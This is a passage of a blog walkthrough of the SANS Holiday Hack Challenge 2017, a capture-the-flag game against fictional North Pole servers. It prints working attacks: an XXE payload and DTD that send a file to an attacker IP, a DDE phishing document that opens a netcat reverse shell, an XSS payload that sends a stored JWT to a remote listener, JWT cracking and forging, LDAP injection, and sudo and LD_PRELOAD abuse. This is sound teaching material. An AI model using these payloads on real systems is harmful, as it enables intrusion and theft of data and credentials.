   ...> GROUP BY sg.title
   ...> ORDER BY 2 DESC
   ...> LIMIT 10;
Stairway to Heaven|11325
|3957
Joy to the World|2162
The Little Boy that Santa Claus Forgot|2140
I Farted on Santa's Lap (Now Christmas Is Gonna Stink for Me)|2132
Christmas Memories|2129
Christmas Is Now Drawing Near at Hand|2126
Blue Holiday|2122
Cold December Night|2120
A Baby Changes Everything|2117
```

At this point we see that “__Stairway to Heaven__” is the #1 song. Let’s run the __runtoanswer__ binary and see if we are right.

```console
elf@3f31d4a83638:~$ ./runtoanswer 
Starting up, please wait......
 
 
Enter the name of the song with the most likes: Stairway to Heaven
That is the #1 Christmas song, congratulations!
```

Awesome, we are right! Once you complete this terminal challenge, you will unlock a new tool that will help you in redirecting the snowball in the levels. After you redirect the snowball for this level, you will unlock more hints for the next challenges.

<a href="https://jhalon.github.io/images/shh47.png"><img src="https://jhalon.github.io/images/shh47.png"></a>

<a href="https://jhalon.github.io/images/shh48.png"><img src="https://jhalon.github.io/images/shh48.png"></a>

### North Pole Christmas Town Infrastructure

#### Elf as a Service (EaaS):

For this challenge we know that the North Pole engineering team has introduced an Elf as a Service (EaaS) platform to optimize resource allocation for mission-critical Christmas engineering projects at http://eaas.northpolechristmastown.com. 

What we need to do is hack the system and retrieve instructions for accessing The Great Book page from C:\greatbook.txt.

So first of all, we need to identify where the EaaS system is located. Looking back at our previous Nmap scan, we can see that it’s located at __10.142.0.13__.

```console
Nmap scan report for eaas.northpolechristmastown.com (10.142.0.13)
Host is up (0.0041s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 10.0
3389/tcp open  ssl/ms-wbt-server?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Once again we see that TPC/80 is open, so let’s use SSH again to forward our TCP/8050 port to TCP/80 of the EaaS System.

```console
root@kali:~/HH# ssh -L 8050:10.142.0.13:80 alabaster_snowball@35.190.140.65
alabaster_snowball@35.190.140.65's password: 
alabaster_snowball@hhc17-apache-struts2:/tmp/asnow.FCginkV6JiLIj2o9JJ8u8tsN$ 
```

Once that’s been completed, we can navigate to __localhost:8050__ and we will be able to see the main page for the EAAS System.

<a href="https://jhalon.github.io/images/shh49.png"><img src="https://jhalon.github.io/images/shh49.png"></a>

Upon inspecting the page, we notice that we are able to check current orders via the __EC2__ link.

<a href="https://jhalon.github.io/images/shh50.png"><img src="https://jhalon.github.io/images/shh50.png"></a>

Upon accessing that page we are redirected to the __DisplayXML__ page, and it seems that we are able to upload a file… and judging by the title of it, we can probably upload an XML file.

<a href="https://jhalon.github.io/images/shh51.png"><img src="https://jhalon.github.io/images/shh51.png"></a>

I know that SANS wrote a very good post about [Exploiting XXE Vulnerabilities in IIS/.NET](https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities).

After reading the post, let’s do something similar… but we will use our Public Amazon EC2 Instance to carry out the attack and grab the Contents of __C:\greatbook.txt__.

First of all, let’s create the evil XML file that we will use to upload.

```console
root@kali:~/HH# gedit evil.xml
root@kali:~/HH# cat evil.xml 
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE demo [
    <!ELEMENT demo ANY >
    <!ENTITY % extentity SYSTEM "http://18.218.75.54:8000/evil.dtd">
    %extentity;
    %inception;
    %sendit;
    ]
<
```

Simply, this file will download and run the commands from the __evil.dtd__ file that will be hosted on our public EC2 instance.
But, before we upload this file – we need to create the __evil.dtd__ file that will get the contents of __C:\greatbook.txt__ and will send it to a netcat listener on our EC2 instance.

The DTD file should look similar to the one below.

```console
ubuntu@ip-172-31-24-12:~$ nano evil.dtd 
ubuntu@ip-172-31-24-12:~$ cat evil.dtd 
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % stolendata SYSTEM "file:///c:/greatbook.txt">
<!ENTITY % inception "<!ENTITY &#x25; sendit SYSTEM 'http://18.218.75.54:4444/?%stolendata;'>">
```

Now that we have that ready, let’s set up a [SimpleHTTPServer](https://docs.python.org/2/library/simplehttpserver.html) via python, and a netcat listener on TCP/4444.

```console
ubuntu@ip-172-31-24-12:~$ python -m SimpleHTTPServer 
Serving HTTP on 0.0.0.0 port 8000 ...
 ```

```console
ubuntu@ip-172-31-24-12:~$ nc -nvlp 4444
Listening on [0.0.0.0] (family 0, port 4444)
```

After that’s all said and done, we can upload the XML file.

<a href="https://jhalon.github.io/images/shh52.png"><img src="https://jhalon.github.io/images/shh52.png"></a>

I also capture the request via Burp just to make sure there were no errors when uploading.

<a href="https://jhalon.github.io/images/shh53.png"><img src="https://jhalon.github.io/images/shh53.png"></a>

You know that the file uploaded successfully when you are presented with and empty page such as the one below.

<a href="https://jhalon.github.io/images/shh54.png"><img src="https://jhalon.github.io/images/shh54.png"></a>

If you also look at your SimpleHTTPServer, you will see a successful GET request was made for you DTD file.

```console
ubuntu@ip-172-31-24-12:~$ python -m SimpleHTTPServer 
Serving HTTP on 0.0.0.0 port 8000 ...
35.185.118.225 - - [29/Dec/2017 16:17:53] "GET /evil.dtd HTTP/1.1" 200 -
 ```

And following that, we should also see the contents of __C:\greatbook.txt__ in the URL parameter from the Netcat listener.

```console
ubuntu@ip-172-31-24-12:~$ nc -nvlp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from [35.185.118.225] port 4444 [tcp/*] accepted (family 2, sport 49877)
GET /?http://eaas.northpolechristmastown.com/xMk7H1NypzAqYoKw/greatbook6.pdf HTTP/1.1
Host: 18.218.75.54:4444
Connection: Keep-Alive
``` 

From here, all we need to do is navigate to http://eaas.northpolechristmastown.com/xMk7H1NypzAqYoKw/greatbook6.pdf and we will be able to see the 6th page of the Great Book.

<a href="https://jhalon.github.io/images/shh55.png"><img src="https://jhalon.github.io/images/shh55.png"></a>

## The Great Book: Page 7

### North Pole and Beyond - Oh Wait! Maybe We Are…

#### Terminal Challenge:

Upon accessing the CranPI Challenge we are presented with the following:

```console
              \ /
            -->*<--
              /o\
             /_\_\
            /_/_0_\
           /_o_\_\_\
          /_/_/_/_/o\
         /@\_\_\@\_\_\
        /_/_/O/_/_/_/_\
       /_\_\_\_\_\o\_\_\
      /_/0/_/_/_0_/_/@/_\
     /_\_\_\_\_\_\_\_\_\_\
    /_/o/_/_/@/_/_/o/_/0/_\
   jgs       [___]  
My name is Shinny Upatree, and I've made a big mistake.
I fear it's worse than the time I served everyone bad hake.
I've deleted an important file, which suppressed my server access.
I can offer you a gift, if you can fix my ill-fated redress.
Restore /etc/shadow with the contents of /etc/shadow.bak, then run "inspect_da_b
ox" to complete this challenge.
Hint: What commands can you run with sudo?
elf@24f154ad424a:~$ 
```

Alright, so this seems like an easy task - all we have to do is recover the __shadow.bak__ file to restore the __/etc/shadow__ file.

There's actually a good post on Stack Exchange that explained how to [restore /etc/shadow with the contents of /etc/shadow.bak](https://serverfault.com/questions/888457/restore-etc-shadow-with-the-contents-of-etc-shadow-bak).

After reading the post, we will run the `sudo -l` command to list the sudo permissions for our account.

```console
elf@24f154ad424a:~$ sudo -l
Matching Defaults entries for elf on 24f154ad424a:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User elf may run the following commands on 24f154ad424a:
    (elf : shadow) NOPASSWD: /usr/bin/find
```

Awesome, so it seems our account has the permissions to run commands with the "__shadow__" group permissions!

So from here, we can simply run the `sudo -g shadow` command followed by any other commands, and they will execute with the __shadow__ group permissions. Simply, just follow along with the previous post to recover the shadow file.

```console
elf@24f154ad424a:~$ sudo -g shadow find /etc/shadow.bak -exec cp {} /etc/shadow \;
elf@24f154ad424a:~$ inspect_da_box 
                     ___
                    / __'.     .-"""-.
              .-""-| |  '.'.  / .---. \
             / .--. \ \___\ \/ /____| |
            / /    \ `-.-;-(`_)_____.-'._
           ; ;      `.-" "-:_,(o:==..`-. '.         .-"-,
           | |      /       \ /      `\ `. \       / .-. \
           \ \     |         Y    __...\  \ \     / /   \/
     /\     | |    | .--""--.| .-'      \  '.`---' /
     \ \   / /     |`        \'   _...--.;   '---'`
      \ '-' / jgs  /_..---.._ \ .'\\_     `.
       `--'`      .'    (_)  `'/   (_)     /
                  `._       _.'|         .'
                     ```````    '-...--'`
/etc/shadow has been successfully restored!
```

Once that's completed and after you get the snowball to the end, you will unlock more hints that will help you in the next challenge.

<a href="https://jhalon.github.io/images/shh56.png"><img src="https://jhalon.github.io/images/shh56.png"></a>

<a href="https://jhalon.github.io/images/shh57.png"><img src="https://jhalon.github.io/images/shh57.png"></a>

### North Pole Christmas Town Infrastructure

#### Elf-Machine Interfaces (EMI) SCADA:

For this challenge we know that the North Pole uses Elf-Machine Interfaces (EMI) to monitor and control critical infrastructure assets. These systems serve many uses, including email access and web browsing. 

We are tasked with gaining access to the EMI server through the use of a phishing attack with our access to the EWA server. Once access is gained, we can retrieve The Great Book page from C:\GreatBookPage7.pdf.

If you remember correctly, in our previous challenge, once we gained access to the EWA Server, we spotted an email concerned about the recent DDE Attacks.

<a href="https://jhalon.github.io/images/shh33.png"><img src="https://jhalon.github.io/images/shh33.png"></a>

<a href="https://jhalon.github.io/images/shh34.png"><img src="https://jhalon.github.io/images/shh34.png"></a>

At the same time, we previously found emails from Alabaster to Mrs. Claus asking for her Cookies Recipe.

<a href="https://jhalon.github.io/images/shh32.png"><img src="https://jhalon.github.io/images/shh32.png"></a>

Taking that into account, we can go ahead and attempt a DDE Attack against Alabaster to gain a reverse shell on his system.

There is a very good post on creating DDE Macros, which can be found here: https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/

Once we read the post, we can create a new DDE that will execute a Netcat connection back to our AWS Instance on TCP/4444.

<a href="https://jhalon.github.io/images/shh58.png"><img src="https://jhalon.github.io/images/shh58.png"></a>

Once that's completed, we can save the file as "__GingerBread Recpipe__" or something along those lines.

Before we precede, let's spawn a netcat listener on our AWS EC2 Instance.

```console
ubuntu@ip-172-31-24-12:~$ nc -nvlp 4444
Listening on [0.0.0.0] (family 0, port 4444)
```

Afterwards, we can return back to the EWA Server and utilize our newly found cookie exploit to access the "__Jessica Claus__" account, which will be used in our phishing attack against Alabaster.

<a href="https://jhalon.github.io/images/shh59.png"><img src="https://jhalon.github.io/images/shh59.png"></a>

Once done, we should have access to Mrs. Claus's email account.

<a href="https://jhalon.github.io/images/shh60.png"><img src="https://jhalon.github.io/images/shh60.png"></a>

From there, let's go ahead and create a new email with the subject "__Gingerbread Cookie Recipe__", attach our Word Document that contains the DDE Attack, and send it off to Alabaster.

<a href="https://jhalon.github.io/images/shh61.png"><img src="https://jhalon.github.io/images/shh61.png"></a>

Once the email is sent, a few moments later we can see that we get a successful Reverse CMD Shell.

<a href="https://jhalon.github.io/images/shh62.png"><img src="https://jhalon.github.io/images/shh62.png"></a>

At this point, we can navigate to the __C:\__ directory and we will spot Page 7 of the Great Book.

<a href="https://jhalon.github.io/images/shh63.png"><img src="https://jhalon.github.io/images/shh63.png"></a>

From here, we can simply use netcat to download the file to our AWS EC2 Instance.

```console
ubuntu@ip-172-31-24-12:~$ nc -l -p 1234 > GreatBookPage7.pdf
```

```console
C:\>nc -w 3 18.218.75.54 1234 < GreatBookPage7.pdf
```

Once completed, we can read Page 7 of the Great Book.

<a href="https://jhalon.github.io/images/shh64.png"><img src="https://jhalon.github.io/images/shh64.png"></a>

## Who's Behind This?

### North Pole and Beyond - We're Off To See The…

#### Terminal Challenge:

Upon accessing the CranPI Challenge, we are presented with the following:

```console
                 .--._.--.--.__.--.--.__.--.--.__.--.--._.--.
               _(_      _Y_      _Y_      _Y_      _Y_      _)_
              [___]    [___]    [___]    [___]    [___]    [___]
              /:' \    /:' \    /:' \    /:' \    /:' \    /:' \
             |::   |  |::   |  |::   |  |::   |  |::   |  |::   |
             \::.  /  \::.  /  \::.  /  \::.  /  \::.  /  \::.  /
         jgs  \::./    \::./    \::./    \::./    \::./    \::./
               '='      '='      '='      '='      '='      '='
Wunorse Openslae has a special challenge for you.
Run the given binary, make it return 42.
Use the partial source for hints, it is just a clue.
You will need to write your own code, but only a line or two.
total 88
-rwxr-xr-x 1 root root 84824 Dec 16 16:47 isit42
-rw-r--r-- 1 root root   654 Dec 15 19:59 isit42.c.un

elf@8b890dbcfb98:~$
```

Interesting, so it seems that we need to write some exploit code to make the __isit42__ binary return 42. Let's read the code to see what we have to work with.

```console
elf@8b890dbcfb98:~$ cat isit42.c.un 
#include <stdio.h>

// DATA CORRUPTION ERROR
// MUCH OF THIS CODE HAS BEEN LOST
// FORTUNATELY, YOU DON'T NEED IT FOR THIS CHALLENGE
// MAKE THE isit42 BINARY RETURN 42
// YOU'LL NEED TO WRITE A SEPERATE C SOURCE TO WIN EVERY TIME

int getrand() {
    srand((unsigned int)time(NULL)); 
    printf("Calling rand() to select a random number.\n");
    // The prototype for rand is: int rand(void);
    return rand() % 4096; // returns a pseudo-random integer between 0 and 4096
}

int main() {
    sleep(3);

    int randnum = getrand();
    if (randnum == 42) {
        printf("Yay!\n");
    } else {
        printf("Boo!\n");
    }

    return randnum;
}
```

Looking at the code, it seems that the __getrand()__ function is ran, and if it equals 42 then we win, otherwise we loose.

There was an interesting post on SANS about using [ld\_preload](https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win) for hijacking and executing command in applications.

What we can do, is create our own __rand()__ function that when called it will print __"Hacked"__ and return 42. This way we have a visual representation when the code is executed.

```console
elf@8b890dbcfb98:~$ nano hack.c
elf@8b890dbcfb98:~$ cat hack.c 
#include <stdio.h>
int rand() {
printf("Hacked!\n");
return 42;
}
```

Once we have that, let's go ahead and use __LD\_PRELOAD__ to load our new __rand()__ function in with the binary application, and then execute it.

```console
elf@8b890dbcfb98:~$ LD_PRELOAD="$PWD/hack_rand" ./isit42 
Starting up ... done.
Calling rand() to select a random number.
Hacked!
                 .-. 
                .;;\ ||           _______  __   __  _______    _______  __    _  _______  _     _  _______  ______ 
               /::::\|/          |       ||  | |  ||       |  |   _   ||  |  | ||       || | _ | ||       ||    _ |
              /::::'();          |_     _||  |_|  ||    ___|  |  |_|  ||   |_| ||  _____|| || || ||    ___||   | ||
            |\/`\:_/`\/|           |   |  |       ||   |___   |       ||       || |_____ |       ||   |___ |   |_||_ 
        ,__ |0_..().._0| __,       |   |  |       ||    ___|  |       ||  _    ||_____  ||       ||    ___||    __  |
         \,`////""""\\\\`,/        |   |  |   _   ||   |___   |   _   || | |   | _____| ||   _   ||   |___ |   |  | |
         | )//_ o  o _\\( |        |___|  |__| |__||_______|  |__| |__||_|  |__||_______||__| |__||_______||___|  |_|
          \/|(_) () (_)|\/ 
            \   '()'   /            ______    _______  _______  ___      ___      __   __    ___   _______ 
            _:.______.;_           |    _ |  |       ||   _   ||   |    |   |    |  | |  |  |   | |       |
          /| | /`\/`\ | |\         |   | ||  |    ___||  |_|  ||   |    |   |    |  |_|  |  |   | |  _____|
         / | | \_/\_/ | | \        |   |_||_ |   |___ |       ||   |    |   |    |       |  |   | | |_____ 
        /  |o`""""""""`o|  \       |    __  ||    ___||       ||   |___ |   |___ |_     _|  |   | |_____  |
       `.__/     ()     \__.'      |   |  | ||   |___ |   _   ||       ||       |  |   |    |   |  _____| |
       |  | ___      ___ |  |      |___|  |_||_______||__| |__||_______||_______|  |___|    |___| |_______|
       /  \|---|    |---|/  \ 
       |  (|42 | () | DA|)  |       _   ___  _______ 
       \  /;---'    '---;\  /      | | |   ||       |
        `` \ ___ /\ ___ / ``       | |_|   ||____   |
            `|  |  |  |`           |       | ____|  |
      jgs    |  |  |  |            |___    || ______| ___ 
       _._  |\|\/||\/|/|  _._          |   || |_____ |   |
      / .-\ |~~~~||~~~~| /-. \         |___||_______||___|
      | \__.'    ||    '.__/ |
       `---------''---------` 
Congratulations! You've won, and have successfully completed this challenge.
```

<a href="https://jhalon.github.io/images/shh65.png"><img src="https://jhalon.github.io/images/shh65.png"></a>

### North Pole Christmas Town Infrastructure

#### Elf Database (EDB):

For this challenge we have to fetch the letter to Santa from the North Pole Elf Database at http://edb.northpolechristmastown.com.

So as previously, we have to figure out where the EDB Server is located. Taking a look at our previous Nmap scan that we ran shows that the server is located at __10.142.0.6__.

```console
Host is up (0.00015s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
80/tcp   open  http    nginx 1.10.3
389/tcp  open  ldap
8080/tcp open  http    Werkzeug httpd 0.12.2 (Python 2.7.13)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port389-TCP:V=7.40%I=7%D=12/28%Time=5A457237%P=x86_64-pc-linux-gnu%r(LD
SF:APSearchReq,83,"0s\x02\x01\x07dn\x04\x000j0\x1b\x04\x14supportedLDAPVer
SF:sion1\x03\x04\x0130\x1a\x04\x0enamingContexts1\x08\x04\x06dc=com0/\x04\
SF:x12supportedExtension1\x19\x04\x171\.3\.6\.1\.4\.1\.4203\.1\.11\.10\x0c
SF:\x02\x01\x07e\x07\n\x01\0\x04\0\x04\0")%r(LDAPBindReq,25,"0#\x02\x01\x0
SF:1a\x1e\n\x01\x02\x04\0\x04\x17Version\x202\x20not\x20supported");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We can see that TCP/80 is open and running a web server, so let's go ahead and use SSH to forward our TCP/8050 port to TCP/80 on __10.142.0.6__.

```console
root@kali:~/HH# ssh -L 8050:10.142.0.6:80 alabaster_snowball@35.190.140.65
alabaster_snowball@35.190.140.65's password: 
alabaster_snowball@hhc17-apache-struts2:/tmp/asnow.LShdupYgziOuBj2fnInGRJXt$
```

And as previously, let's also make sure that our web proxy is set to listen on TCP/8050.

<a href="https://jhalon.github.io/images/shh66.png"><img src="https://jhalon.github.io/images/shh66.png"></a>

At this time, we can navigate to __10.142.0.6__ and we will be presented with the following Login Page for the EDB.

<a href="https://jhalon.github.io/images/shh67.png"><img src="https://jhalon.github.io/images/shh67.png"></a>

A quikc look into the __robots.txt__ file shows us that there is a __/dev__ directory.

<a href="https://jhalon.github.io/images/shh68.png"><img src="https://jhalon.github.io/images/shh68.png"></a>

Navigating to __/dev/__ reveales a link to a LDIF Template page.

<a href="https://jhalon.github.io/images/shh69.png"><img src="https://jhalon.github.io/images/shh69.png"></a>

Inside that text file we are presented with what looks to be an LDAP Template for the EDB Server. This could be helpful for us in the future or for the login page as LDAP is open and running on TCP/389.

<a href="https://jhalon.github.io/images/shh70.png"><img src="https://jhalon.github.io/images/shh70.png"></a>

If you actually took the time to read some of the hints provided to us by Wunorse, then you would see some specific information about a [XSS](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)) Attack that Wunorse got via some weird email, and that JWT Tokens are being used.

<a href="https://jhalon.github.io/images/shh71.png"><img src="https://jhalon.github.io/images/shh71.png"></a>

I'm going to assume that since we are on the EDB Server - we will be able to execte some sort of XSS Attack via the Support Function on the page.

But before we do that, let's dig into the source code of the page to see if we can't get some hints on how the login page functions.

If we look at the source code toward the bottom of the index page, we spot a rather unusual token called __np-auth__ that seems to be used for authentication. Intrestingly enough, it also seems to be a token that is in the [localStorage](https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage) property of the webpage. 

<a href="https://jhalon.github.io/images/shh72.png"><img src="https://jhalon.github.io/images/shh72.png"></a>

If we are able to execute XSS on the page, then we should be able to gain access to that token and hopefully use it to log in!

Another thing that really caught my attention was the __custom.js__ file. If we take a look at the source code for that JavaScript file, then we see some intresting information about the Customer Service Request page.

<a href="https://jhalon.github.io/images/shh73.png"><img src="https://jhalon.github.io/images/shh73.png"></a>

We can see that there in fact is some filtering being done in the message portion of the service request. Technically the script is filtering anything that contains the word "__script__" in it, both lowercase and uppercase. At the same time, the line above it makes sure that the line ends with a period.

So let's go ahead and click on the "__Support__" link on the login page. We should be presented with a prompt about login issues. Let's quickly fill out the form with Alabaster's infomration and a test message, like so...

<a href="https://jhalon.github.io/images/shh74.png"><img src="https://jhalon.github.io/images/shh74.png"></a>

Once done, let's submit that and we will see our Password Reset Request.

<a href="https://jhalon.github.io/images/shh75.png"><img src="https://jhalon.github.io/images/shh75.png"></a>

Alright, so that works fine. Let's go back to the form we sumbitted and try to insert some JavaScript to create a XSS Attack. I suggest you read up on some of the [XSS Bypasses](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet) which will greatly help you bypass the filtering on this page.

From the __custom.js__ code, we know that we can't use the word "__script__" in our XSS, and the JavaScript code has to be before the period.

So an easy way to bypass these restrictions is by using the [SVG (Scalable Vector Graphics) onload](https://www.w3.org/TR/SVG/script.html#OnLoadEventAttribute) atrribute, and simply inject it into the middle of our message.

So let's create a simple XSS Alert to test. We can inject the follow JavaScript to create an alert box with the words "XSS".

`<svg/onload=alert('XSS')>`

So our test form should like like so...

<a href="https://jhalon.github.io/images/shh76.png"><img src="https://jhalon.github.io/images/shh76.png"></a>

Once done, let's submit it and we should get our alert box with the words "XSS".

<a href="https://jhalon.github.io/images/shh77.png"><img src="https://jhalon.github.io/images/shh77.png"></a>

Perfect! We got a working XSS Attack. So all we habe to do now is access the __np-auth__ token and have it sent to our AWS EC2 Instance.

We can use the following JavaScript code to axxomplish that. Just remeber to replace "__[IP]__" with your own AWS EC2 IP.

`<svg/onload=document.location="http://[IP]:8000/?c="+localStorage.getItem("np-auth")>`

So our form should look like so...

<a href="https://jhalon.github.io/images/shh78.png"><img src="https://jhalon.github.io/images/shh78.png"></a>

Before we send that out, let's make sure we have a listener running on our AWS EC2 Instance.

```console
ubuntu@ip-172-31-24-12:~$ nc -nvlp 8000
Listening on [0.0.0.0] (family 0, port 8000)
```

Now that we have that, submit the form. A few seconds later, we should get a connect back from the EDB Server with the __np-auth__ token.

```console
ubuntu@ip-172-31-24-12:~$ nc -nvlp 8000
Listening on [0.0.0.0] (family 0, port 8000)
Connection from [35.196.239.128] port 8000 [tcp/*] accepted (family 2, sport 54990)
GET /?c=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: http://127.0.0.1/reset_request?ticket=UEKET-50I7S-BNOWO-5P138
User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en-US,*
Host: 18.218.75.54:8000
```

Perfect! So we have our token! From the looks of it, and from the hints provided to us - this is a JWT Token. To decipher this, we can go to https://jwt.io/ and just past in our token to see the decoded payload.

<a href="https://jhalon.github.io/images/shh79.png"><img src="https://jhalon.github.io/images/shh79.png"></a>

Taking a look at the token, we see our data and that this token belong to Alabster Snowball wgo is in the Engineering Department... but unfortuantly it's expired!

So for us to be able to use this token, we will have to change the date to something current. But before we can do that, we need to creack the Secret Key to have a valid signature.

To accomplish this we can use [John The Ripper](http://www.openwall.com/john/), but we first need to do a few things.

First of all, we need to conver the JWT Token into a format that John will understand. To do so, we will use the [JWT2John](https://github.com/Sjord/jwtcrack/blob/master/jwt2john.py) script from GitHub.

Simple run the script followed by the token and save it to a file.

```console
python jwt2john.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I > alabaster.jwt
```

Reading the saved file, we should see our converted token.

```console
root@kali:~/HH# cat alabaster.jwt 
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9#33b6782370adad6b78486c1f83b9a2e95f7fe2b6991397a156423d874e24afa2
```

Nice, now we can go ahead and crack the converted JTW Token. Unfortuantly for many users the version of John that ships with Kali will not work, so we need to install the [Jumbo Version](https://github.com/magnumripper/JohnTheRipper) of John which can be found on GitHub.

I know that the process of setting this up is a little complicated, so I will take you through it step by step.

To start let's navigatge to the __/opt__ directory and let's close the GitHub repository.

```console
root@kali:~/HH# cd /opt/
root@kali:/opt# git clone https://github.com/magnumripper/JohnTheRipper.git
```

After we have scusefully downloaded the repository, let's go ahead and [make](https://www.gnu.org/software/make/) the John binary form it's associated files.

```console
root@kali:/opt# cd JohnTheRipper/
root@kali:/opt/JohnTheRipper# cd src
root@kali:/opt/JohnTheRipper/src# ./configure 
root@kali:/opt/JohnTheRipper/src# make -s clean && make -sj4
```

Once you sucsefully create the files, navigate to the __/run/__ directory in the John folder, and run John agasint our converted JWT Token.

```console
root@kali:/opt/JohnTheRipper# cd run/
root@kali:/opt/JohnTheRipper/run# ./john /root/HH/alabaster.jwt 
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 AVX 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
3lv3s            (?)
1g 0:00:01:37 DONE 3/3 (2018-01-11 13:51) 0.01025g/s 3277Kp/s 3277Kc/s 3277KC/s 3k3ys..mo_tl
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Awesome! We were able to crack the secret code for the signature which is "__3lv3s__".

From here, we can go back to jwt.io and change the "__expires__" date of the JWT token, and also include our cracked secret to create a valid signature.

<a href="https://jhalon.github.io/images/shh80.png"><img src="https://jhalon.github.io/images/shh80.png"></a>

Once we have a valid JWT Token with an update date, we can return back to the EDB Login Page and open up our Developer Tools in our Browser. From here, we can use the __setItem__ atrribute for localStorage to set __np-auth__ with our new token.

<a href="https://jhalon.github.io/images/shh81.png"><img src="https://jhalon.github.io/images/shh81.png"></a>

After that token is set, refresh the page and we should be able to access Alabaster's accout.

<a href="https://jhalon.github.io/images/shh82.png"><img src="https://jhalon.github.io/images/shh82.png"></a>

Once we have access to the account, upon looking around we spot a "__Santa Panel__" link from the Search function.

<a href="https://jhalon.github.io/images/shh83.png"><img src="https://jhalon.github.io/images/shh83.png"></a>

Looking into the source code and jQuery attributes of the link, we see that we need to be in the "__administrators__" department, and we need to be Santa Claus.

<a href="https://jhalon.github.io/images/shh84.png"><img src="https://jhalon.github.io/images/shh84.png"></a>

```javascript
function(e) {
  e.preventDefault();
  if (user_json['dept'] == 'administrators') {
    pass = prompt('Confirm you are a Claus by confirming your password: ').trim()
    if (pass) {
      poster("/html", {
        santa_access: pass
      }, token, function(result) {
        if (result) {
          $('#inneroverlay').html(result);
          $('.overlay').css('display', 'flex');
        } else {
          Materialize.toast('Incorrect Password...', 4000);
        }
      });
    }
  } else {
    Materialize.toast('You must be a Claus to access this panel!', 4000);
  }
}
```

At this point we don't have much to work with, so we need to find a SQL injection or something in this Database to pull out Santa Clau's password and information.

While browsing the page and captuirng requests and responses via Burp, I came across a very intresting note about LDAP.

<a href="https://jhalon.github.io/images/shh85.png"><img src="https://jhalon.github.io/images/shh85.png"></a>

An initial look at this note reveals to us the LDAP Query that is being used for the request form!

SANS actually have a very good post on [Undersanding and Exploiting Web Based LDAP](https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap) that we can use to help us!

After reading the article, the first thing I do is search for Alabster's name in the Elf Name field, while pulling up all the infomration I can from the drop down.

<a href="https://jhalon.github.io/images/shh86.png"><img src="https://jhalon.github.io/images/shh86.png"></a>

Captruing the Request in Burp also revleas some intresting infomration about the attribute query.

<a href="https://jhalon.github.io/images/shh87.png"><img src="https://jhalon.github.io/images/shh87.png"></a>

Alright, awesome we got Alabaster's information... but let's see if we can't pull out everybody's information from the database.

In the SANS Blog Post, the write was able to inject `))(department=it)(|(cn=` into his query to list all the users. So let's try using that query to see if it works.

<a href="https://jhalon.github.io/images/shh88.png"><img src="https://jhalon.github.io/images/shh88.png"></a>

Awesome, it does work! Upon scrolling down to the bottom of the page we see Santa's Information.

<a href="https://jhalon.github.io/images/shh89.png"><img src="https://jhalon.github.io/images/shh89.png"></a>

Now that we have Santas Name, Email, and Department, let's return back to JWT.io and change our JWT Token so we can login as Santa.

<a href="https://jhalon.github.io/images/shh90.png"><img src="https://jhalon.github.io/images/shh90.png"></a>

Once again, once we have the generated token, set the token using __setItem__ in your Developer console, and refresh the page.

<a href="https://jhalon.github.io/images/shh91.png"><img src="https://jhalon.github.io/images/shh91.png"></a>

<a href="https://jhalon.github.io/images/shh92.png"><img src="https://jhalon.github.io/images/shh92.png"></a>

Nice, so we were able to access Santas account! Unfortunatly for us we still can't access the Santa Panel as we need a password!

<a href="https://jhalon.github.io/images/shh93.png"><img src="https://jhalon.github.io/images/shh93.png"></a>

At this point, I opt to capture the LDAP Query request via Brup to pull all the department info. Once the request is capture, I change the attribures field to __*__ so it includes all the information.

<a href="https://jhalon.github.io/images/shh94.png"><img src="https://jhalon.github.io/images/shh94.png"></a>

Once we send that out, and captue the response, we can see everyones information, including Santas Password which seems to be MD5 encoded.

